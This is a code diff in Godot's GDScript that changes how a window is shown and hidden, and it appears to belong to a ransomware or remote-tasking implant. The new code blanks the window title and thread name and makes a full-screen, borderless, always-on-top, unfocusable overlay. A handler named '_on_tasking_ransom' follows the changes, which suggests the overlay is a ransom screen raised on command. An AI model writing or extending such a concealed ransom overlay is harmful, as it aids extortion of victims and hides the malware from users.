@@ -10,30 +10,38 @@ func _ready():
 	hide()
 
 func show():
-	# var window_size = OS.get_window_size()
-	# OS.set_window_position(screen_size*0.5 - window_size*0.5) # If not fullscreen
-
-	var screen_size = DisplayServer.screen_get_size(0)
-
-	get_window().set_position(Vector2(0,0))
-
 	get_window().set_title("")
 	var _donotcare = OS.set_thread_name("")
-	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (true) else Window.MODE_WINDOWED
-	#OS.window_size = screen_size
+	var screen_size = DisplayServer.screen_get_size(0)
 
+	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_WINDOWED)
+	DisplayServer.window_set_position(Vector2i(0,0), 0)
+	DisplayServer.window_set_size(screen_size, 0)
+
+	DisplayServer.window_set_exclusive(0, true)
+	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_ALWAYS_ON_TOP, true, 0)
+	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_BORDERLESS, true, 0)
+	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_NO_FOCUS, true, 0)
+	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_TRANSPARENT, true, 0)
+	gui.get_node("ColorRect").custom_minimum_size = Vector2(screen_size.x+screen_size.x/2, screen_size.y+screen_size.y/2)
+	
 	gui.position = screen_size*0.5 - display_size*0.75
 
 	gui.show()
+	gui.visible = true
+
 
 func hide():
 	gui.hide()
-	
+
+	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MINIMIZED)
+	DisplayServer.window_set_size(Vector2i(0,0), 0)
+
 	get_window().set_title("")
 	var _donotcare = OS.set_thread_name("")
-	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (false) else Window.MODE_WINDOWED
 	get_window().size = Vector2(1,1)
 	gui.position = Vector2(-1,-1)
+
 	gui.reset()
 
 func _on_tasking_ransom(transport, task):
